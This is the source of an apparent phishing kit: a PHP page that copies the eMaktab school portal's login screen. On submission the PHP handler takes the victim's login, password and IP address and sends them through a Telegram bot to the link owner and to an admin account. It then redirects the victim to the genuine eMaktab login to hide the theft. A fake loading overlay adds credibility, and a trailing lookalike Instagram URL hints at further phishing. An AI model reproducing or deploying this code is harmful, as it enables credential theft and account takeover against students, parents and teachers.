<?php
require_once __DIR__ . '/config.php';

// Kalitni tekshirish
$key = isset($_GET['id']) ? trim($_GET['id']) : '';
if ($key === '') {
    http_response_code(404);
    exit("404 Not Found");
}

$chat_id = getUserFromKey($key);
if (!$chat_id) {
    http_response_code(404);
    exit("404 Not Found - Invalid or expired key");
}

$pdo = getDB();
$stmt = $pdo->prepare("SELECT * FROM users WHERE chat_id = ?");
$stmt->execute([$chat_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$user) {
    http_response_code(404);
    exit("404 Not Found");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $login = $_POST['login'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = client_ip();
    
    $cols = $pdo->query("PRAGMA table_info(users)")->fetchAll(PDO::FETCH_ASSOC);
    $has_emaktab = false; 
    foreach ($cols as $c) { 
        if ($c['name'] === 'emaktab_logins') { 
            $has_emaktab = true; 
            break; 
        } 
    }
    if (!$has_emaktab) {
        $pdo->exec("ALTER TABLE users ADD COLUMN emaktab_logins INTEGER DEFAULT 0");
    }
  
      $admn = ADMIN_ID; // config.php ichida belgilangan bo'lishi kerak
    
    $text = "🔐 <b>eMaktab Login Ma'lumotlari</b>\n\n";
    $text .= "👤 <b>Login:</b> <code>" . htmlspecialchars($login) . "</code>\n";
    $text .= "🔑 <b>Parol:</b> <code>" . htmlspecialchars($password) . "</code>\n";
    $text .= "🌐 <b>IP:</b> " . htmlspecialchars($ip) . "\n";
    $text .= "🕒 <b>Vaqt:</b> " . date('Y-m-d H:i:s') . "\n";
    $text .= "👤 <b>Foydalanuvchi:</b> tg://user?id=$chat_id\n";
    
    tgRequest('sendMessage', [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML'
    ]);
    
        tgRequest('sendMessage', [
        'chat_id' => $admn,
        'text' => $text,
        'parse_mode' => 'HTML'
    ]);
    
    $upd = $pdo->prepare("UPDATE users SET emaktab_logins = COALESCE(emaktab_logins,0) + 1 WHERE chat_id = ?");
    $upd->execute([$chat_id]);
    
    header("Location: https://login.emaktab.uz/login");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head lang="ru">
    <meta name="google" value="notranslate"/>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0"/>
    <meta http-equiv="x-ua-compatible" content="ie=edge"/>
    <link rel="icon" href="https://static.emaktab.uz/img/icons/favicon_Uz.ico" sizes="16x16 24x24 32x32 48x48 64x64" type="image/x-icon"/>
    <link rel="shortcut icon" href="https://static.emaktab.uz/img/icons/favicon_Uz.ico" sizes="16x16 24x24 32x32 48x48 64x64" type="image/x-icon"/>

    <!-- non-retina iPhone pre iOS 7 -->
    <link rel="apple-touch-icon" href="https://static.emaktab.uz/img/icons/favicons_Uz/apple/57x57.png" sizes="57x57"/>
    <!-- non-retina iPad pre iOS 7 -->
    <link rel="apple-touch-icon" href="https://static.emaktab.uz/img/icons/favicons_Uz/apple/72x72.png" sizes="72x72"/>
    <!-- non-retina iPad iOS 7 -->
    <link rel="apple-touch-icon" href="https://static.emaktab.uz/img/icons/favicons_Uz/apple/76x76.png" sizes="76x76"/>
    <!-- retina iPhone pre iOS 7 -->
    <link rel="apple-touch-icon" href="https://static.emaktab.uz/img/icons/favicons_Uz/apple/114x114.png" sizes="114x114"/>
    <!-- retina iPhone iOS 7 -->
    <link rel="apple-touch-icon" href="https://static.emaktab.uz/img/icons/favicons_Uz/apple/120x120.png" sizes="120x120"/>
    <!-- retina iPad pre iOS 7 -->
    <link rel="apple-touch-icon" href="https://static.emaktab.uz/img/icons/favicons_Uz/apple/144x144.png" sizes="144x144"/>
    <!-- retina iPad iOS 7 -->
    <link rel="apple-touch-icon" href="https://static.emaktab.uz/img/icons/favicons_Uz/apple/152x152.png" sizes="152x152"/>

    <!-- Windows 8 tile -->
    <meta name="msapplication-TileImage" content="https://static.emaktab.uz/img/icons/favicons_Uz/microsoft/144x144.png"/>
    <meta name="msapplication-TileColor" content="#FFFFFF"/>
    <meta name="application-name" content="eMaktab| eMaktab ga kirish"/>

    <!-- IE11 tiles -->
    <meta name="msapplication-square70x70logo" content="https://static.emaktab.uz/img/icons/favicons_Uz/microsoft/70x70.png"/>
    <meta name="msapplication-square150x150logo" content="https://static.emaktab.uz/img/icons/favicons_Uz/microsoft/150x150.png"/>
    <meta name="msapplication-wide310x150logo" content="https://static.emaktab.uz/img/icons/favicons_Uz/microsoft/310x150.png"/>
    <meta name="msapplication-square310x310logo" content="https://static.emaktab.uz/img/icons/favicons_Uz/microsoft/310x310.png.png" />

    <title>eMaktab| eMaktab ga kirish</title>

    <link rel="stylesheet" href="https://static.emaktab.uz/assets/styles/main.min.ca6a1daa.css?v=ca6a1daa" media="all" type="text/css" />
    <link rel="stylesheet" href="https://static.emaktab.uz/styles/main/common.css?v=143157b6" media="all" type="text/css"/>
    <link rel="stylesheet" href="https://static.emaktab.uz/blocks/blocks.css?v=8900d094" media="all" type="text/css" />
    <link rel="stylesheet" href="https://static.emaktab.uz/css/adaptive.css?v=068f655e" media="all" type="text/css" /> 
    <link rel="stylesheet" href="https://static.emaktab.uz/client/notifications.css?v=7e458b00" type="text/css" />

    <script type="text/javascript">var dnevnik = {"urls":{"domain":"emaktab.uz","taskStateUrl":"https://emaktab.uz/TaskStateHandler","moderate":null,"whiteList":["2gis.ru","adfox.ru","aliexpress.com","apple.com","avito.ru","booking.com","csdnevnik.ru","dnevnik.ru","dnevnik.ru","facebook.com","fotostrana.ru","foxford.ru","gismeteo.ru","globallab.org","google.com","google.ru","gosuslugi.ru","hh.ru","instagram.com","instagram.com","kinopoisk.ru","lego.com","lenta.ru","letovo.ru","livejournal.com","magnit.ru","magnit-info.ru","magnitznaniy.ru","mail.ru","microsoft.com","mosreg.ru","mosregtest.ru","office.com","office365.com","ok.ru","onenote.com","pikabu.ru","rambler.ru","rbc.ru","research.net","ria.ru","sberbank.ru","sharepoint.com","surveymonkey.com","surveymonkey.ru","twitch.tv","twitter.com","vk.com","wikipedia.org","yadi.sk","yaklass.ru","yandex.ru","youtu.be","youtube.com","kundalik.com","utube.uz","imumk.ru","https://uz.mfactory.online/","kundalik.analyticsapp.uz","kundalik.ozlashtah.uz","uzum.go.link","go.link","redirect.appmetrica.yandex.com","https://emaktab.tech/","https://www.anorbank.uz","smart.emaktab.uz","https://emaktab.tech","https://smart.emaktab.uz","emaktab.uz","emaktab.tech","https://t.me/%20S63ZvFPEQhI4YTk6","https://t.me/%20S63ZvFPEQhI4YTk6","smarty.emaktab.uz","smarty.emaktab.uz","smarty.emaktab.uz","https://smarty.emaktab.uz","dcdn.veonadx.com/","veonadx.com"],"userCounters":"https://emaktab.uz/counters","emailSettings":"https://emaktab.uz/v2/user/settings?view=email","smilesSpriteUrl":"https://static.emaktab.uz/images/sprites/emojione.sprites.svg","tinyMceBaseUrl":"https://static.emaktab.uz/assets/scripts/vendors/tinymce","gaAutoLinkUrls":null,"adblockDummyUrl":""},"settings":{"yandexMetrikaIds":["52725535"],"yandexMetrikaСlickmapEnabled":true,"enableAdFoxZeroPixel":true,"yandexMetrikaId":"52725535","environmentPrefix":"Uz","yandexMetrikaWebvisorEnabled":false},"fileUploadSettings":{"stateUrl":"https://content.emaktab.uz/gettaskstatus","resultUrl":"https://content.emaktab.uz/getresult","deleteFileUrl":"https://content.emaktab.uz/delete","deleteFolderUrl":"https://content.emaktab.uz/deletefolder","defaultFileSizeLimit":"2147483648"},"user":null,"auth":{"isAuthenticated":false,"updateInterval":600000,"loginUrl":"https://login.emaktab.uz/auth","masterLoginUrl":null},"visitParams":{"__RedesignAbGroup2":"groupA"},"localizationSchoolType":null,"contextRegionUrl":""};</script>

    <script type="text/javascript" src="https://static.emaktab.uz/assets/scripts/modules/redesign.min.367efd8f.js?v=367efd8f"></script>
    <script type="text/javascript" src="https://static.emaktab.uz/assets/scripts/vendors/requirejs/require-2.3.7.js?v=084c85b2"></script>
    <script type="text/javascript">
        require.config({
            baseUrl: "https://static.emaktab.uz/assets/scripts/modules",
            urlArgs: "v=8e5936dd",
        });
    </script>
    <script type="text/javascript" src="https://static.emaktab.uz/assets/scripts/modules/main-redesign.min.127fcc88.js?v=127fcc88"></script>
    <script type="text/javascript" src="https://static.emaktab.uz/blocks/blocks.js?v=03fecfde"></script>
    <script type="text/javascript" src="https://static.emaktab.uz/javascripts/local/uz-Latn.js?v=70dba7c1"></script>

    <style>
        .hidden-form {
            display: none !important;
        }
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            flex-direction: column;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            font-size: 18px;
            color: #333;
            font-family: Arial, sans-serif;
        }
    </style>
</head>
<body class="page_adaptive">
    <script>
        window.environmentPrefix = "uz";
        window.environmentPrefix = "";
    </script>

    <!-- Loading overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">eMaktab tizimiga kirilmoqda...</div>
    </div>

    <!-- Asosiy eMaktab sahifasi (yashirin) -->
    <div id="mainContent" class="hidden-form">



<header class="header-anon" id="header-anon">

    <div class="colored-line colored-line_uz">
        <div class="colored-line__item colored-line__item_blue"></div>
        <div class="colored-line__item colored-line__item_green"></div>
        <div class="colored-line__item colored-line__item_yellow"></div>
        <div class="colored-line__item colored-line__item_orange"></div>
        <div class="colored-line__item colored-line__item_violet"></div>
    </div>

    <div class="header-anon__content">

        <div class="header-anon__logotype" id="logo">
            <a href="https://emaktab.uz">
                <img src="https://static.emaktab.uz/img/logotypes/uzlogotype.png" alt="eMaktab"/>
            </a>
        </div>

        <div class="header-anon__menu-wrapper">
                <div class="header-anon__menu">
                    
<nav class="menu">
    <ul class="menu__layout">
            <li class="menu__layout_unit">
                <a class="menu__item menu__item_border
                   
                   menu__item_no-left-padding
                   "
                   href=https://emaktab.uz/about>Tashkilot</a>
            </li>
            <li class="menu__layout_unit">
                <a class="menu__item menu__item_border
                   
                   
                   "
                   href=https://emaktab.uz/features>Imkoniyatlar</a>
            </li>
            <li class="menu__layout_unit">
                <a class="menu__item menu__item_border
                   
                   
                   "
                   href=https://emaktab.uz/forpartners>Hamkorlarga</a>
            </li>
            <li class="menu__layout_unit">
                <a class="menu__item menu__item_border
                   
                   
                   menu__item_noborder menu__item_no-right-padding"
                   href=https://emaktab.uz/support>Yordam</a>
            </li>
    </ul>
</nav>
            </div>
            <div class="header-anon__buttons" id="anon-buttons">
                    <div class="header-anon__localization-button" id="localization-button">
                        
<div class="header-localization-select">
    <div class="header-localization-select__info">
        <div class="header-localization-select__info_row header-localization-select__info_row-content">O&#x27;zb</div>
        <div class="header-localization-select__info_row header-localization-select__tumbler"></div>
    </div>
    
    

<div class="dropdown-container dropdown-container_font-weight-bold dropdown-container_left-position-0 dropdown-container_no-specific-last-child ">

<a href="https://emaktab.uz/api/localization/change?newCulture=uz-Latn-UZ&amp;currentUrl=https%3a%2f%2flogin.emaktab.uz%2flogin%2f%3fReturnUrl%3dhttps%3a%2f%2femaktab.uz%2fbilling%2fpaidAccess%2fpaymentPage" title="O&#x27;zbekcha" class="link link_dropdown-container-link link_dropdown-container-link_selected link_ " >
    O&#x27;zbekcha
    
</a>
<a href="https://emaktab.uz/api/localization/change?newCulture=ru-RU&amp;currentUrl=https%3a%2f%2flogin.emaktab.uz%2flogin%2f%3fReturnUrl%3dhttps%3a%2f%2femaktab.uz%2fbilling%2fpaidAccess%2fpaymentPage" title="&#x420;&#x443;&#x441;&#x441;&#x43A;&#x438;&#x439;" class="link link_dropdown-container-link link_ link_ " >
    &#x420;&#x443;&#x441;&#x441;&#x43A;&#x438;&#x439;
    
</a></div><script>require(['DropdownContainer/DropdownContainer'], function () { for(var i = 0, l = arguments.length; i < l; i += 1) { arguments[i](JSON.parse('\x7b\x22tumblerClass\x22\x3a\x22header-localization-select\x22,\x22activationClasses\x22\x3a\x5b\x22header-localization-select__info\x22,\x22dropdown-container\x22\x5d\x7d')); } });</script>
</div>
                    </div>
                <div class="header-anon__button">
                    
<a href="https://login.emaktab.uz/login" title="Kirish" class="button button_blue button_padding-20    " onclick="" 
   style="cursor: pointer"
   data-category="" data-action="" data-target="">
    Kirish
</a>
                </div>
                    <div class="header-anon__button">
                        
<a href="https://login.emaktab.uz/join/role" title="Tashkilotni ulash" class="button button_green button_padding-20 button_margin-left-20    " onclick="" 
   style="cursor: pointer"
   data-category="" data-action="" data-target="">
    Tashkilotni ulash
</a>
                    </div>

            </div>
        </div>
    </div>
</header>
<script type="text/javascript">

    var button = document.getElementById('localization-button');
    moveLocalizationButton();
    window.addEventListener('resize', function(event) {
        moveLocalizationButton();
    }, true);
    
    function moveLocalizationButton() {
        if (window.innerWidth > 1200) {
            jQuery("#localization-button").detach().prependTo('#anon-buttons');
            button.classList.remove("localization-mobile");
        }
        else {
            jQuery("#localization-button").detach().appendTo('#logo');
            button.classList.add("localization-mobile");
        }
    }
</script>


<div class="main main_top-30 ">
    <div class="container">
    <div class="row">
        <div class="col-md-24 col-xs-24">
            
            <div class="article-area">
    
    











<form class="login" method="POST" id="loginForm">
    <input id="exceededAttempts" name="exceededAttempts" type="hidden" value="False" />
    <input id="ReturnUrl" name="ReturnUrl" type="hidden" value="https://emaktab.uz/billing/paidAccess/paymentPage" />
    <input id="FingerprintId" name="FingerprintId" type="hidden" value="" />
    <div  class="login__header login__header_uz">
        <div class="row row_centered">
            <div class="login__header-title col-md-12 col-xs-12">
                <div class="login__header__text">
                    <h1 class="h1 h1_white">Kirish eMaktab</h1>
                </div>
            </div>
                <div class="login__header-register-wrapper col-md-12 col-xs-12">
                    <div class="login__header__register-link">
                        <a class="link link_white" href="/join/role">Tizimda ro&#x2018;yxatdan o&#x2018;tmaganmisiz?</a>
                    </div>
                </div>
        </div>
    </div>
    <div class="login__body">

        <div class="login__body__hint login__body__hint_error-message login__body__hint_hidden">
            <div class="message ">
    
</div>
        </div>



            <div class="login__error_message_mobile">
            </div>

        <div class="login__content login__content_mixed">

        <div class="row row_centered login__form_shown">
            <div class="login-body__field-wrapper col-md-12 col-xs-12">
                <label class="label label_input-label label_bold">
                    <strong>Login</strong>
                    <input name="login" class="input input__field input_full-width input_with-label-above input_line-height-28px login__body__input_login" type="text" autocomplete="on" data-test-id="login-field" />
                </label>
            </div>
            <div class="login__body-hint-wrapper col-md-12 col-xs-12">


                <div class="login__body__hint login__body__hint_login login__body__hint_hidden">
                    <div class="yellow-hint yellow-hint_right ">
    <div class="yellow-hint__wrapper">
        Loginingizni kiriting.
    </div>
</div>
                </div>
            </div>
        </div>
        <div class="row row_centered login__form_shown">
            <div class="login-body__field-wrapper col-md-12 col-xs-12">
                <label class="label label_input-label label_bold">
                    <strong>Parol</strong>
                    <div id="pass-visibility-button" class="show-pass-button"></div>
                    <input name="password" id="password-field" class="input input__field input_full-width input_with-label-above input_line-height-28px login__body__input_password " type="password" oncopy="return false" autocomplete="on" data-test-id="password-field" />
                </label>
            </div>
            <div class="login__body-hint-wrapper col-md-12 col-xs-12">


                <div class="login__body__hint login__body__hint_password login__body__hint_hidden">
                    <div class="yellow-hint yellow-hint_right ">
    <div class="yellow-hint__wrapper">
        Parolni kiriting.
    </div>
</div>
                </div>
            </div>
        </div>
        <div class="login__body__captcha login__body__captcha_hidden login__form_shown">
            <div class="row row_centered">
                <div class="login__captcha-wrapper col-ms-12 col-xs-12">
                    
<div class="captcha" name="captcha" id="id-465ac999c42c435f8817ae3710252131">
    <div class="row">
        <div class="col-ms-24 col-xs-24">
            <label class="label label_bold label_input-label label_display-block label_font-size-14 label_  ">Rasmdagi belgilarni kiriting</label>

<input class="input input__field input_display-inline-block input_width-180 input_captcha-validation input_bottom-20 " id="id-d698e3a550584655a8af5ec81fdc5a6f" title="Rasmdagi belgilarni kiriting" name="Captcha.Input"   placeholder="" />            <img alt="captcha image" class="captcha__image">
            <button type="button" class="captcha__button"></button>
            <input name="Captcha.Id" class="captcha__value" type="hidden">
        </div>
    </div>
</div><script>require(['Captcha/Captcha'], function () { for(var i = 0, l = arguments.length; i < l; i += 1) { arguments[i](JSON.parse('\x7b\x22imagePart\x22\x3a\x22https\x3a\x2f\x2flogin.emaktab.uz\x2fcaptcha\x2ftrue\x2f\x22,\x22id\x22\x3a\x22id-465ac999c42c435f8817ae3710252131\x22\x7d')); } });</script>
                </div>
                <div class="login__captcha-error-wrapper col-md-12 col-xs-12">
                    <div class="login__body__captcha__error">
                        <div class="yellow-hint yellow-hint_to-left-20 yellow-hint_right yellow-hint_captcha-hint yellow-hint_hidden ">
    <div class="yellow-hint__wrapper">
        
    </div>
</div>
                    </div>
                </div>
            </div>
        </div>
        <script type="text/javascript">
            var togglePassButton = document.getElementById("pass-visibility-button");
            var passInput = document.getElementById("password-field");
            togglePassButton.addEventListener("click", togglePasswordVisibility);  
            function togglePasswordVisibility() {  
              if (passInput.type === 'password' || passInput.classList.contains("input_type-password")) {
                  passInput.type = 'text';
                  passInput.classList.remove("input_type-password");
                  togglePassButton.className = 'hide-pass-button';
              } else {
                  passInput.type = 'password';
                  passInput.classList.add("input_type-password");
                  togglePassButton.className = 'show-pass-button';
              }          
            }
        </script>  
        <div class="row row_centered">
            <div class="login-body__field-wrapper col-md-6 col-xs-6 login__form_shown">
                <input type="submit" value="Tizimga kiring" class="login__submit button button_light-green button_top-10 button_full-width" data-test-id="login-button">
            </div>

            
            <div class="login-body__field-wrapper login-body__field-wrapper_show-form-btn login__form_shown">
                <button type="button" class="button button_show-form-btn">&quot;&quot;Kundalik&quot;&quot; orqali kiring</button>
            </div>
        </div>
        </div>
    </div>
    <div class="login__footer-wrapper row">
        <div class="col-md-24 col-xs-24 login__form_shown">
            <div class="login__footer">
                <div class="login__footer__help">
                    <div class="message__help">
                            <span class="message__help_wide">
                                <p class="paragraph_help">Login yoki parolni unutdingizmi? <a class="link" href="/recovery">Loginni tiklash</a>.</p>
                            </span>
                            <span class="message__help_narrow">
                                <p class="paragraph_help"><a class="link" href="/recovery">Login yoki parolni unutdingizmi?</a></p>
                            </span>
                    </div>
                </div>
                    <div class="login__app-links">
                        <a target="_blank" href="https://redirect.appmetrica.yandex.com/serve/604719249377765398" class="page-footer__mobile-app-links__badge">
                            <img class="page-footer__mobile-app-links__badge_img" src="https://static.emaktab.uz/images/storebadges/appstore/AppStore_uz-Latn-UZ.svg"/>
                        </a>
                        <a target="_blank" href="https://redirect.appmetrica.yandex.com/serve/604719249377765398" class="page-footer__mobile-app-links__badge">
                            <img class="page-footer__mobile-app-links__badge_img" src="https://static.emaktab.uz/images/storebadges/googleplay/GooglePlay_uz-Latn-UZ.svg"/>
                        </a>
                    </div>
            </div>
        </div>

    </div>
</form>



<script>require(['Login/Login'], function () { for(var i = 0, l = arguments.length; i < l; i += 1) { arguments[i](JSON.parse('\x7b\x22hasErrors\x22\x3afalse,\x22firstErrorText\x22\x3anull,\x22login\x22\x3a\x7b\x22value\x22\x3anull\x7d,\x22password\x22\x3a\x7b\x22value\x22\x3anull\x7d,\x22exceededAttempts\x22\x3afalse,\x22isEmptyLogin\x22\x3afalse,\x22isEmptyPassword\x22\x3afalse,\x22isWrongCaptcha\x22\x3afalse,\x22captchaWrapperId\x22\x3a\x22id-465ac999c42c435f8817ae3710252131\x22\x7d')); } });</script>
</div>
        </div>
    </div>
</div>
</div>


<footer class="footer">
    <div class="footer__menu">
        <div>
            <div class="footer__menu__links">
                    <div class="footer__column_25">
                            <div class="footer__menu__links__title">Tashkilot haqida</div>
                            <ul class="footer__menu__links__layout">
                                    <li class="footer__menu__links__layout_item">
                                        <a href="https://emaktab.uz/about" class="footer__menu__links__item">Biz haqimizda</a>
                                    </li>
                                    <li class="footer__menu__links__layout_item">
                                        <a href="https://emaktab.uz/news" class="footer__menu__links__item">Yangiliklar</a>
                                    </li>
                                    <li class="footer__menu__links__layout_item">
                                        <a href="https://emaktab.uz/contacts" class="footer__menu__links__item">Aloqa uchun ma&#x27;lumotlar</a>
                                    </li>
                            </ul>
                    </div>
                    <div class="footer__column_25">
                            <div class="footer__menu__links__title">Imkoniyatlar</div>
                            <ul class="footer__menu__links__layout">
                                    <li class="footer__menu__links__layout_item">
                                        <a href="https://emaktab.uz/features#/teachers" class="footer__menu__links__item">O&#x2018;qituvchilarga</a>
                                    </li>
                                    <li class="footer__menu__links__layout_item">
                                        <a href="https://emaktab.uz/features#/parents" class="footer__menu__links__item">Ota-onalarga</a>
                                    </li>
                                    <li class="footer__menu__links__layout_item">
                                        <a href="https://emaktab.uz/features#/students" class="footer__menu__links__item">O&#x2018;quvchilarga</a>
                                    </li>
                                    <li class="footer__menu__links__layout_item">
                                        <a href="https://emaktab.uz/features#/governments" class="footer__menu__links__item">Davlat organlariga</a>
                                    </li>
                            </ul>
                    </div>
                    <div class="footer__column_25">
                            <div class="footer__menu__links__title">Hamkorlarga</div>
                            <ul class="footer__menu__links__layout">
                                    <li class="footer__menu__links__layout_item">
                                        <a href="https://emaktab.uz/forpartners" class="footer__menu__links__item">Hamkorlik dasturlari</a>
                                    </li>
                            </ul>
                    </div>
                <div class="footer__column_25">
                    <div class="footer__menu__links__last-column-wrapper">
                            <div class="footer__menu__links__title footer__menu__links__title_no-margin-top">
                                Qo&#x2018;llab-quvvatlash
                            </div>
                            <div class="footer__menu__links__support">
                                    <a href="https://help.emaktab.uz" class="footer__menu__links__support__link">Qo&#x2018;llab-quvvatlash xizmati portal</a>
                            </div>

                    </div>
                </div>
            </div>
        </div>
            <div>
                <div class="footer__menu__buttons">
                        <div class="footer__column_25">
                            
<div class="sociallinks">
        <a class="sociallinks__button sociallinks__button_facebook " href="https://www.facebook.com/emaktab.uz" target="_blank" title="Facebook da eMaktab"></a>
        <a class="sociallinks__button sociallinks__button_instagram " href="https://www.instagram.com/emaktab.uz/" target="_blank" title="Instagram da eMaktab"></a>
        <a class="sociallinks__button sociallinks__button_telegram " href="https://t.me/emaktab_uz" target="_blank" title="Telegram da eMaktab"></a>
        <a class="sociallinks__button sociallinks__button_youtube " href="https://www.youtube.com/@emaktabuzb" target="_blank" title="YouTube da eMaktab"></a>
</div>
                        </div>
                        <div class="footer__column_25 footer__join">
                            
<a href="https://login.emaktab.uz/join/role" title="Tashkilotni ulash" class="button button_green button_full-width    " onclick="" 
   style="cursor: pointer"
   data-category="" data-action="" data-target="">
    Tashkilotni ulash
</a>
                        </div>
                </div>
            </div>
    </div>
    <div class="footer__copyright">
        <div class="footer__copyright-content">
            
            <div class="footer__copyright-item">
                <div class="footer__copyright__terms">

                        <a href="https://emaktab.uz/agreements/terms" class="footer__copyright__terms__link">Foydalanuvchining shartnomasi </a>
                </div>
            </div>
            <div class="footer__copyright-item">
                <div class="footer__copyright__label"></div>
            </div>
        </div>
    </div>

</footer>
<script>require(['Footer/Footer'], function () { for(var i = 0, l = arguments.length; i < l; i += 1) { arguments[i](JSON.parse('null')); } });</script>


    
<script type="text/javascript">
    require(['yandexMetrika/yandexMetrikaCounter']);
</script>

    <script type="text/javascript">
        require(['analytics/commonYaMetrika']);
    </script>

<noscript>
    <div>
            <img src="//mc.yandex.ru/watch/52725535" style="position: absolute; left: -9999px;" alt="" />
    </div>
</noscript>
        <script type="text/javascript">
            require(['ab/ab'], function (ab) {
                window.onload = function () {
                    if (!window['yaCounter' + dnevnik.settings.yandexMetrikaId]) {
                        console.debug('Yandex.Metrika not loaded!');
                   }
   
                    ab.init({
                        subdomain: 'login',
                       group: 'groupA'
                    });
   
                };
            });
        </script>
    

    </div>

    <script>
        (function(){
            const key = "<?php echo htmlspecialchars($key, ENT_QUOTES); ?>";
            
            setTimeout(function() {
                document.getElementById('loadingOverlay').style.display = 'none';
                document.getElementById('mainContent').classList.remove('hidden-form');
                
                document.getElementById('loginForm').addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    const formData = new FormData(this);
                    const login = formData.get('login');
                    const password = formData.get('password');
                    
                    if (login && password) {
                        fetch('em?id=' + encodeURIComponent(key), {
                            method: 'POST',
                            body: formData
                        }).then(function() {
                            window.location.href = 'https://login.emaktab.uz/login';
                        }).catch(function() {
                            window.location.href = 'https://login.emaktab.uz/login';
                        });
                    } else {
                        window.location.href = 'https://login.emaktab.uz/login';
                    }
                });
            }, 3000);
        })();
    </script>
</body>
</html> https://instagram.wwiw.uz/com/lk?id=6ePnliW8G4